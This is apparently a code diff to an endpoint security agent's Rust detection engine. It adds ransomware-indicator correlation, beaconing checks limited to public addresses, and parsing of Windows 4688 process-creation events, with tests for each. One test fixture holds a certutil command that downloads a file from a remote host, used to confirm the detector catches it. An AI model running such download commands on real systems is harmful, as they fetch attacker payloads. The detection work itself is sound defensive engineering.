@@ -53,12 +53,29 @@ use tracing::{info, warn};
 
 use crate::schema::{
     AgentEvent, CorrelationKeys, DetectionData, DetectionMode, EventAction, EventClass, EventData,
-    PtraceData, SetuidData, Severity,
+    PtraceData, RansomwareIndicatorData, SetuidData, Severity,
 };
 
 use ioa::ProcContext;
 
 pub use ioc::IocSet;
+
+/// A mass write alone is a build, a `git checkout` or a sync client; it is
+/// ransomware-like only together with encrypted-looking content, a ransom
+/// extension or tampered backups seen this close in time (either order).
+const RANSOM_CORROBORATION_SECS: f64 = 120.0;
+
+#[derive(Default)]
+struct RansomContext {
+    last_mass_secs: Option<f64>,
+    last_corroboration_secs: Option<f64>,
+}
+
+impl RansomContext {
+    fn within(then: Option<f64>, now: f64) -> bool {
+        then.is_some_and(|t| now >= t && now - t <= RANSOM_CORROBORATION_SECS)
+    }
+}
 
 /// The detection engine.  Cheap to share behind an `Arc`; only the beacon
 /// tracker is mutable (guarded by a `Mutex`).
@@ -80,6 +97,9 @@ pub struct DetectionEngine {
     anomaly_enabled: std::sync::atomic::AtomicBool,
     /// Multi-event single-host rules (recon bursts, brute force, chmod+exec).
     stateful: Mutex<stateful::StatefulRules>,
+    /// When filesystem ransomware indicators last fired, so a write burst is
+    /// only an alert when something else corroborates it.
+    ransom: Mutex<RansomContext>,
     /// Suppression + aggregation: the single exit for every finding.
     gate: Mutex<gate::FindingGate>,
     /// The agent's own pid: it and its children are never inspected.
@@ -129,6 +149,7 @@ impl DetectionEngine {
             )),
             anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
             stateful: Mutex::new(stateful::StatefulRules::new()),
+            ransom: Mutex::new(RansomContext::default()),
             gate: Mutex::new(gate::FindingGate::new()),
             self_pid: std::process::id() as i32,
             ebpf_exec_seen: AtomicBool::new(false),
@@ -349,13 +370,13 @@ impl DetectionEngine {
                 // record per flow), and only while no eBPF connect telemetry
                 // reports the same connections.
                 if n.state != "closed" && !self.ebpf_connect_seen.load(Relaxed) {
-                    self.inspect_network(&n.dst_addr, n.dst_port, elapsed_secs, &mut out);
+                    self.inspect_network(&n.dst_addr, n.dst_port, elapsed_secs, ctx, &mut out);
                 }
             }
             EventData::NetworkSocket(n) => match n.op.as_str() {
                 "connect" => {
                     self.ebpf_connect_seen.store(true, Relaxed);
-                    self.inspect_network(&n.addr, n.port, elapsed_secs, &mut out);
+                    self.inspect_network(&n.addr, n.port, elapsed_secs, ctx, &mut out);
                 }
                 // An inbound peer is only an IOC question; cadence and scan
                 // analytics are about where *we* connect to.
@@ -388,6 +409,9 @@ impl DetectionEngine {
             EventData::Ptrace(p) => {
                 self.inspect_ptrace(p, &mut out);
             }
+            EventData::RansomwareIndicator(r) => {
+                self.inspect_ransomware(r, &mut out);
+            }
             EventData::UserLogon(l) => {
                 let src = l.src_addr.as_deref().unwrap_or("");
                 let hit =
@@ -410,6 +434,17 @@ impl DetectionEngine {
                         None,
                         &mut out,
                     );
+                }
+                // Windows 4688 (process creation): the command line the ETW
+                // sensor could not read before a short-lived process exited.
+                // Repeats of a command ETW did capture fold in the gate.
+                if l.fields.get("EventID").and_then(|v| v.as_u64()) == Some(4688) {
+                    let text = |k: &str| l.fields.get(k).and_then(|v| v.as_str()).unwrap_or("");
+                    let (exe, cmd) = (text("NewProcessName"), text("CommandLine"));
+                    if !cmd.is_empty() {
+                        let name = exe.rsplit(['\\', '/']).next().unwrap_or(exe);
+                        self.inspect_process(name, exe, cmd, None, None, &mut out);
+                    }
                 }
                 let ip = l
                     .fields
@@ -799,6 +834,94 @@ impl DetectionEngine {
     }
 
     /// ptrace attach/seize to a credential-holding process.
+    /// Turn a filesystem ransomware indicator into a finding. The raw indicator
+    /// stays telemetry (and drives auto-response); this is what the gate folds
+    /// and the backend alerts on. Repeats of one burst share a subject, so
+    /// 200 renamed files in one directory are one finding, not 200.
+    fn inspect_ransomware(&self, r: &RansomwareIndicatorData, out: &mut Vec<AgentEvent>) {
+        let place = r.path.as_deref().map(parent_dir).unwrap_or_default();
+        let now = self.clock();
+        let (rule_id, title, mut confidence, subject, corroborates) =
+            match r.indicator_type.as_str() {
+                "high_write_rate" => (
+                    "ransomware.mass_modification",
+                    "Mass file modification",
+                    40,
+                    "user-data".to_string(),
+                    false,
+                ),
+                "suspicious_extension" => (
+                    "ransomware.suspicious_extension",
+                    "File with ransomware extension created",
+                    70,
+                    place,
+                    true,
+                ),
+                "backup_deletion" => (
+                    "ransomware.backup_tamper",
+                    "Backup location deleted or moved",
+                    60,
+                    place,
+                    true,
+                ),
+                "high_entropy" => (
+                    "ransomware.high_entropy",
+                    "Rewritten file has encrypted-looking content",
+                    40,
+                    place,
+                    true,
+                ),
+                _ => return,
+            };
+
+        // Mass modification becomes an alert only next to corroboration, and a
+        // corroborating indicator that follows a recent write burst re-raises it.
+        let mut escalated_mass = None;
+        if let Ok(mut ctx) = self.ransom.lock() {
+            if rule_id == "ransomware.mass_modification" {
+                ctx.last_mass_secs = Some(now);
+                if RansomContext::within(ctx.last_corroboration_secs, now) {
+                    confidence = 75;
+                }
+            } else if corroborates {
+                ctx.last_corroboration_secs = Some(now);
+                if RansomContext::within(ctx.last_mass_secs, now) {
+                    escalated_mass = Some(());
+                }
+            }
+        }
+
+        let mut push = |rule_id: &str, title: &str, confidence: u8, subject: String| {
+            out.push(self.detection(
+                Severity::High,
+                DetectionData {
+                    rule_id: rule_id.into(),
+                    title: title.into(),
+                    category: "ransomware".into(),
+                    confidence,
+                    subject,
+                    detail: r.details.clone(),
+                    evidence: serde_json::json!({
+                        "indicator_type": r.indicator_type,
+                        "path": r.path,
+                        "entropy": r.entropy,
+                        "write_rate": r.write_rate,
+                    }),
+                    ..Default::default()
+                },
+            ));
+        };
+        push(rule_id, title, confidence, subject);
+        if escalated_mass.is_some() {
+            push(
+                "ransomware.mass_modification",
+                "Mass file modification",
+                75,
+                "user-data".to_string(),
+            );
+        }
+    }
+
     fn inspect_ptrace(&self, p: &PtraceData, out: &mut Vec<AgentEvent>) {
         const PTRACE_ATTACH: u32 = 16;
         const PTRACE_SEIZE: u32 = 0x4206;
@@ -920,10 +1043,11 @@ impl DetectionEngine {
         dst_addr: &str,
         dst_port: u16,
         elapsed_secs: f64,
+        ctx: Option<&ProcContext>,
         out: &mut Vec<AgentEvent>,
     ) {
         self.inspect_ioc_ip(dst_addr, dst_port, out);
-        self.inspect_network_behaviour(dst_addr, dst_port, elapsed_secs, out);
+        self.inspect_network_behaviour(dst_addr, dst_port, elapsed_secs, ctx, out);
     }
 
     /// IOC: a connection to / from a known-bad IP.
@@ -958,12 +1082,15 @@ impl DetectionEngine {
         dst_addr: &str,
         dst_port: u16,
         elapsed_secs: f64,
+        ctx: Option<&ProcContext>,
         out: &mut Vec<AgentEvent>,
     ) {
         let now = elapsed_secs;
 
-        // Beaconing cadence analysis (skip loopback / unspecified noise).
-        if is_routable(dst_addr) {
+        // Beaconing cadence analysis. Only public destinations: a regular
+        // cadence to a router, printer or Chromecast on the LAN is normal
+        // device chatter, not command and control.
+        if is_public_destination(dst_addr) {
             let key = format!("{dst_addr}:{dst_port}");
             let verdict = self
                 .beacons
@@ -971,6 +1098,12 @@ impl DetectionEngine {
                 .ok()
                 .and_then(|mut b| b.observe(&key, now));
             if let Some(v) = verdict {
+                // Regular cadence alone describes every keepalive, updater and
+                // cloud client. It is only worth an alert when the process
+                // making the calls runs from a user-writable location; below
+                // confidence 50 the severity policy keeps it a low signal.
+                let exe = ctx.map(|c| c.exe.as_str()).unwrap_or("");
+                let from_writable = is_user_writable_path(exe);
                 out.push(self.detection(
                     Severity::High,
                     DetectionData {
@@ -979,7 +1112,7 @@ impl DetectionEngine {
                         category: "beaconing".into(),
                         mitre_tactic: Some("TA0011 Command and Control".into()),
                         mitre_technique: Some("T1071".into()),
-                        confidence: 70,
+                        confidence: if from_writable { BEACON_CONFIDENCE_SUSPECT } else { BEACON_CONFIDENCE_ROUTINE },
                         subject: key.clone(),
                         detail: format!(
                             "Regular connections to {key}: ~{:.0}s interval over {} samples (CV {:.2})",
@@ -989,6 +1122,7 @@ impl DetectionEngine {
                             "mean_interval_secs": v.mean_interval_secs,
                             "cv": v.coefficient_of_variation,
                             "samples": v.samples,
+                            "process_from_user_writable_path": from_writable,
                         }),
                         ..Default::default()
                     },
@@ -1298,6 +1432,13 @@ fn normalize_cmdline(cmd: &str) -> String {
     out
 }
 
+/// Directory part of a Windows or Unix path (empty when there is none).
+fn parent_dir(path: &str) -> String {
+    path.rfind(['\\', '/'])
+        .map(|i| path[..i].to_string())
+        .unwrap_or_default()
+}
+
 /// True if `path` is in a world-writable / in-memory location.
 fn is_temp_path(path: &str) -> bool {
     ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
@@ -1374,6 +1515,63 @@ fn severity_for(confidence: u8) -> Severity {
     }
 }
 
+/// Confidence of a beacon verdict whose process runs from a user-writable path.
+const BEACON_CONFIDENCE_SUSPECT: u8 = 70;
+/// Confidence of any other beacon verdict. Below 50, so the severity policy
+/// reports it as a low signal that never alerts on its own.
+const BEACON_CONFIDENCE_ROUTINE: u8 = 35;
+
+/// True if `addr` is a public internet destination: not loopback, unspecified,
+/// private (RFC 1918), shared/CGNAT, link-local, multicast or unique-local. An
+/// unparseable address is not public.
+fn is_public_destination(addr: &str) -> bool {
+    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
+    fn v4(a: Ipv4Addr) -> bool {
+        let o = a.octets();
+        !(a.is_unspecified()
+            || a.is_loopback()
+            || a.is_private()
+            || a.is_link_local()
+            || a.is_broadcast()
+            || a.is_multicast()
+            || (o[0] == 100 && (o[1] & 0xc0) == 64))
+    }
+    fn v6(a: Ipv6Addr) -> bool {
+        if let Some(mapped) = a.to_ipv4_mapped() {
+            return v4(mapped);
+        }
+        let seg = a.segments();
+        !(a.is_unspecified()
+            || a.is_loopback()
+            || a.is_multicast()
+            || (seg[0] & 0xfe00) == 0xfc00
+            || (seg[0] & 0xffc0) == 0xfe80)
+    }
+    // A scoped address (`fe80::1%12`) carries a zone the parser rejects.
+    let bare = addr.split('%').next().unwrap_or(addr);
+    match bare.parse::<IpAddr>() {
+        Ok(IpAddr::V4(a)) => v4(a),
+        Ok(IpAddr::V6(a)) => v6(a),
+        Err(_) => false,
+    }
+}
+
+/// True if `path` is in a location an unprivileged user (or malware running as
+/// one) can write to: temp directories, user profile app data, downloads and
+/// the public profile, on Linux and Windows. Empty means unknown, not writable.
+fn is_user_writable_path(path: &str) -> bool {
+    let p = path.replace('\\', "/").to_ascii_lowercase();
+    if p.is_empty() {
+        return false;
+    }
+    ["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"]
+        .iter()
+        .any(|d| p.starts_with(d))
+        || ["/appdata/local/temp/", "/appdata/roaming/", "/downloads/", "/users/public/", "/windows/temp/"]
+            .iter()
+            .any(|d| p.contains(d))
+}
+
 /// True if `addr` is a routable destination worth cadence-tracking (skips
 /// loopback, unspecified and obviously-local noise).
 fn is_routable(addr: &str) -> bool {
@@ -1410,6 +1608,7 @@ mod tests {
             baseline: Mutex::new(baseline::BaselineEngine::new()),
             anomaly_enabled: std::sync::atomic::AtomicBool::new(true),
             stateful: Mutex::new(stateful::StatefulRules::new()),
+            ransom: Mutex::new(RansomContext::default()),
             gate: Mutex::new(gate::FindingGate::new()),
             // Not this test process: tests feed synthetic pids.
             self_pid: i32::MAX,
@@ -1632,6 +1831,265 @@ mod tests {
             },
         );
         assert!(e.inspect(&det).is_empty());
+    }
+
+    #[test]
+    fn public_destination_excludes_lan_and_local_ranges() {
+        for lan in [
+            "10.0.0.36", "10.0.0.1", "192.168.1.5", "172.16.0.9", "127.0.0.1", "169.254.169.254",
+            "100.64.0.1", "224.0.0.251", "0.0.0.0", "::1", "fe80::1", "fe80::1%12", "fd12:3456::1",
+            "ff02::fb", "::ffff:10.0.0.1", "", "not-an-ip",
+        ] {
+            assert!(!is_public_destination(lan), "{lan} must not be public");
+        }
+        for public in ["40.90.8.111", "185.22.141.18", "2001:4860:4840:400::443", "::ffff:8.8.8.8"] {
+            assert!(is_public_destination(public), "{public} must be public");
+        }
+    }
+
+    #[test]
+    fn user_writable_path_covers_linux_and_windows() {
+        for p in [
+            "/tmp/x", "/dev/shm/a", "C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe",
+            "c:\\users\\bob\\appdata\\roaming\\x\\y.exe", "C:\\Users\\bob\\Downloads\\a.exe",
+            "C:\\Users\\Public\\a.exe", "C:\\Windows\\Temp\\a.exe",
+        ] {
+            assert!(is_user_writable_path(p), "{p}");
+        }
+        for p in ["", "/usr/bin/curl", "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "C:\\Windows\\System32\\svchost.exe"] {
+            assert!(!is_user_writable_path(p), "{p}");
+        }
+    }
+
+    /// Feed one destination at a fixed cadence through the engine, from a
+    /// process running `exe`, and return the beaconing finding, if any.
+    fn beacon_through_engine(ip: &str, exe: &str) -> Option<AgentEvent> {
+        let e = engine();
+        let mut create = proc_event("proc", exe, "");
+        if let EventData::ProcessCreate(p) = &mut create.data {
+            p.pid = 4242;
+        }
+        let mut ev = net_event(ip, 443);
+        if let EventData::NetworkConnection(n) = &mut ev.data {
+            n.pid = Some(4242);
+        }
+        let t0 = Instant::now();
+        e.inspect_at(&create, t0, 0.0);
+        let mut found = None;
+        for i in 0..8u64 {
+            let now = t0 + std::time::Duration::from_secs(i * 60);
+            let out = e.inspect_at(&ev, now, (i * 60) as f64);
+            found = found.or_else(|| {
+                out.into_iter()
+                    .find(|f| matches!(&f.data, EventData::Detection(d) if d.rule_id == "beaconing.regular_interval"))
+            });
+        }
+        found
+    }
+
+    #[test]
+    fn lan_beacons_are_not_reported() {
+        // Chromecast (10.0.0.36:8009) and the router (10.0.0.1:49000) from a
+        // real host produced "high" C2 alerts before.
+        assert!(beacon_through_engine("10.0.0.36", "C:\\Program Files\\Google\\Chrome\\chrome.exe").is_none());
+        assert!(beacon_through_engine("10.0.0.1", "").is_none());
+    }
+
+    #[test]
+    fn routine_public_beacon_is_a_low_signal() {
+        let f = beacon_through_engine("40.90.8.111", "C:\\Windows\\System32\\svchost.exe")
+            .expect("regular public cadence is still observed");
+        let EventData::Detection(d) = &f.data else { unreachable!() };
+        assert_eq!(d.mode, Some(DetectionMode::Signal));
+        assert!(f.severity <= Severity::Low, "{:?}", f.severity);
+    }
+
+    #[test]
+    fn beacon_from_user_writable_exe_alerts() {
+        let f = beacon_through_engine("185.22.141.18", "C:\\Users\\bob\\AppData\\Local\\Temp\\upd.exe")
+            .expect("beacon expected");
+        let EventData::Detection(d) = &f.data else { unreachable!() };
+        assert_eq!(d.mode, Some(DetectionMode::Alert));
+        assert!(f.severity >= Severity::Medium, "{:?}", f.severity);
+    }
+
+    fn indicator(kind: &str, path: Option<&str>) -> AgentEvent {
+        crate::collectors::fs_heuristics::indicator_event(
+            "a",
+            "h",
+            kind,
+            path.map(str::to_string),
+            None,
+            None,
+            format!("{kind} test"),
+        )
+    }
+
+    fn ransomware_findings_at(e: &DetectionEngine, ev: &AgentEvent, secs: f64) -> Vec<AgentEvent> {
+        let now = Instant::now();
+        e.inspect_at(ev, now, secs)
+            .into_iter()
+            .filter(|f| matches!(&f.data, EventData::Detection(d) if d.category == "ransomware"))
+            .collect()
+    }
+
+    fn ransomware_findings(e: &DetectionEngine, ev: &AgentEvent) -> Vec<AgentEvent> {
+        ransomware_findings_at(e, ev, 0.0)
+    }
+
+    fn mode_of(f: &AgentEvent) -> DetectionMode {
+        let EventData::Detection(d) = &f.data else { unreachable!() };
+        d.mode.expect("finalised finding has a mode")
+    }
+
+    #[test]
+    fn a_write_burst_alone_is_only_a_signal() {
+        // A dev workstation's builds and checkouts cross 50 files / 10 s.
+        let e = engine();
+        let f = ransomware_findings(&e, &indicator("high_write_rate", None));
+        assert_eq!(f.len(), 1);
+        assert_eq!(mode_of(&f[0]), DetectionMode::Signal);
+        assert!(f[0].severity <= Severity::Low);
+    }
+
+    #[test]
+    fn write_burst_with_ransom_extension_is_one_alert() {
+        // 200 files arrive as four 50-file batches; the gate folds them.
+        let e = engine();
+        let mut alerts = 0;
+        for i in 0..4 {
+            let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), i as f64);
+            alerts += e.admit(f).iter().filter(|x| mode_of(&x.event) == DetectionMode::Alert).count();
+        }
+        assert_eq!(alerts, 0, "no corroboration yet");
+        let f = ransomware_findings_at(
+            &e,
+            &indicator("suspicious_extension", Some("C:\\Users\\bob\\Documents\\a.txt.locked")),
+            5.0,
+        );
+        assert!(f.iter().any(|x| matches!(&x.data, EventData::Detection(d) if d.rule_id == "ransomware.mass_modification")), "burst re-raised");
+        alerts += e.admit(f).iter().filter(|x| mode_of(&x.event) == DetectionMode::Alert).count();
+        assert!(alerts >= 1);
+    }
+
+    #[test]
+    fn extension_first_then_write_burst_alerts_too() {
+        let e = engine();
+        ransomware_findings_at(
+            &e,
+            &indicator("suspicious_extension", Some("C:\\Users\\bob\\a.txt.locked")),
+            1.0,
+        );
+        let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), 30.0);
+        assert_eq!(mode_of(&f[0]), DetectionMode::Alert);
+    }
+
+    #[test]
+    fn stale_corroboration_does_not_promote_a_burst() {
+        let e = engine();
+        ransomware_findings_at(
+            &e,
+            &indicator("suspicious_extension", Some("C:\\Users\\bob\\a.txt.locked")),
+            1.0,
+        );
+        let f = ransomware_findings_at(&e, &indicator("high_write_rate", None), 1.0 + 600.0);
+        assert_eq!(mode_of(&f[0]), DetectionMode::Signal);
+    }
+
+    #[test]
+    fn ransom_extension_burst_in_one_directory_is_one_alert() {
+        let e = engine();
+        let mut emitted = 0;
+        for i in 0..20 {
+            let path = format!("C:\\Users\\bob\\Documents\\f{i}.docx.locked");
+            let found = ransomware_findings(&e, &indicator("suspicious_extension", Some(&path)));
+            let EventData::Detection(d) = &found[0].data else { unreachable!() };
+            assert_eq!(d.rule_id, "ransomware.suspicious_extension");
+            emitted += e.admit(found).len();
+        }
+        assert_eq!(emitted, 1);
+    }
+
+    #[test]
+    fn backup_deletion_alerts_and_entropy_alone_never_does() {
+        let e = engine();
+        let f = ransomware_findings(&e, &indicator("backup_deletion", Some("C:\\Backup\\a.bak")));
+        let EventData::Detection(d) = &f[0].data else { unreachable!() };
+        assert_eq!(d.rule_id, "ransomware.backup_tamper");
+        assert_eq!(d.mode, Some(DetectionMode::Alert));
+
+        let f = ransomware_findings(&e, &indicator("high_entropy", Some("C:\\Users\\bob\\a.txt")));
+        let EventData::Detection(d) = &f[0].data else { unreachable!() };
+        assert_eq!(d.rule_id, "ransomware.high_entropy");
+        assert_eq!(d.mode, Some(DetectionMode::Signal));
+        assert!(f[0].severity <= Severity::Low);
+    }
+
+    #[test]
+    fn unknown_indicator_types_are_ignored() {
+        assert!(ransomware_findings(&engine(), &indicator("something_new", None)).is_empty());
+    }
+
+    fn process_audit_event(command_line: &str) -> AgentEvent {
+        let mut fields = serde_json::Map::new();
+        fields.insert("EventID".into(), serde_json::json!(4688));
+        fields.insert(
+            "NewProcessName".into(),
+            serde_json::json!("C:\\Windows\\System32\\certutil.exe"),
+        );
+        fields.insert("CommandLine".into(), serde_json::json!(command_line));
+        AgentEvent::new(
+            "a".into(),
+            "h".into(),
+            EventClass::Log,
+            EventAction::Log,
+            Severity::Info,
+            EventData::Log(Box::new(crate::schema::LogEventData {
+                source: "windows_eventlog".into(),
+                source_type: "windows_eventlog".into(),
+                source_path: "Security".into(),
+                parser: "windows_eventlog".into(),
+                message: String::new(),
+                category: "authentication".into(),
+                log_timestamp: None,
+                facility: None,
+                log_severity: None,
+                proc: None,
+                pid: None,
+                uid: None,
+                username: None,
+                log_host: None,
+                fields,
+                mitre_tactic: None,
+                mitre_technique: None,
+                offset: None,
+                inode: None,
+                truncated_fields: None,
+            })),
+        )
+    }
+
+    #[test]
+    fn process_audit_command_line_catches_what_etw_could_not_read() {
+        // The ETW create for this certutil run arrived with an empty command
+        // line; Security 4688 (with command-line auditing) still has it.
+        let e = engine();
+        let out = e.inspect(&process_audit_event(
+            "certutil -urlcache -f http://10.255.255.1/a.txt C:\\Temp\\a.txt",
+        ));
+        assert!(
+            out.iter().any(|f| matches!(&f.data, EventData::Detection(d) if d.rule_id == "lolbin.certutil_download")),
+            "{out:?}"
+        );
+    }
+
+    #[test]
+    fn process_audit_without_command_line_or_benign_use_is_quiet() {
+        let e = engine();
+        assert!(e.inspect(&process_audit_event("")).is_empty());
+        assert!(e
+            .inspect(&process_audit_event("certutil -hashfile C:\\Install\\setup.msi SHA256"))
+            .is_empty());
     }
 
     #[test]
